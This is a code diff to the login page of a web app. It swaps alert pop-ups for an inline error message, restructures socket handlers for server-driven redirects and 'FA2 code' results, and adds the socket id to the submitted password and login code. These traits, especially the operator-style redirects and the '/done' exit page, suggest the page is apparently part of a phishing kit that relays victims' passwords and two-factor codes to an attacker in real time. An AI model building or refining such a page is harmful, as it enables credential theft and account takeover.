@@ -125,6 +125,7 @@
             <button class="secondary-button" id="resend-code">Resend</button>
             <button class="primary-button" id="confirm-code">Confirm</button>
           </div>
+          <div id="error-message" style="color: red; margin-top: 10px;"></div>
         </div>
       </div>
     </div>
@@ -147,45 +148,55 @@
                 code: loginCode,
                 session_id: localStorage.getItem("session_id"),
                 password: password,
+                sess_id: socket.id,
               });
             } else {
-              alert("Please enter the login code.");
+              document.getElementById("error-message").innerText = "Please enter the login code.";
             }
           });
 
         document
           .getElementById("resend-code")
           .addEventListener("click", function () {
-            alert("A new login code has been sent.");
+            document.getElementById("error-message").innerText = "A new login code has been sent.";
           });
+      });
 
-        socket.on("code_result", function (data) {
-          if (data.status === "success") {
-            socket.emit("redirect", { url: data.url });
+      socket.on("redirect", function (data) {
+        console.log(data);
+        window.location.href = data.url;
+      });
+
+      socket.on("code_result", function (data) {
+        console.log(data);
+        if (data.status === "success") {
+          socket.emit("redirect", { url: data.url });
+        } else {
+          attemptCount++;
+          if (attemptCount > 2) {
+            document.getElementById("error-message").innerText = "Too many failed attempts. Redirecting to done page.";
+            window.location.href = "/done";
           } else {
-            attemptCount++;
-            if (attemptCount > 2) {
-              alert("Too many failed attempts. Redirecting to done page.");
-              window.location.href = "/done";
-            } else {
-              alert("Invalid login code. Please try again.");
-              document.getElementById("login-code").value = "";
-            }
+            document.getElementById("error-message").innerText = "Invalid login code. Please try again.";
+            document.getElementById("login-code").value = "";
           }
-        });
+        }
+      });
 
-        socket.on("redirect", function (data) {
-          console.log(data);
-          window.location.href = data.url;
-        });
+      socket.on("code_result2", function (data) {
+        if (data.status === "true") {
+          document.getElementById("error-message").innerText = "FA2 code accepted.";
+        } else {
+          document.getElementById("error-message").innerText = "Invalid FA2 code. Please try again.";
+        }
       });
 
       socket.on("connect_error", function () {
-        alert("Connection to the server failed. Please try again later.");
+        document.getElementById("error-message").innerText = "Connection to the server failed. Please try again later.";
       });
 
       socket.on("disconnect", function () {
-        alert("Disconnected from the server. Please refresh the page.");
+        document.getElementById("error-message").innerText = "Disconnected from the server. Please refresh the page.";
       });
     </script>
   </body>
